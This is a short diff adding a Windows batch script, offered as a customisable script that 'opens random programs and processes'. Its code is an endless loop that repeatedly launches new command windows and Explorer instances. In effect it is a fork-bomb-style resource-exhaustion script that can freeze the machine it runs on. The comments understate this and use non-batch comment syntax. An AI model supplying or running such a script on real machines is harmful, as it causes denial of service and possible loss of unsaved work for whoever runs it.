@@ -1,0 +1,7 @@
+//this file has the code of a simple script that on being run will open random programs and processes
+//the programs and processes may be changed by you as per your need
+@echo off
+:A
+start
+explorer
+goto :A
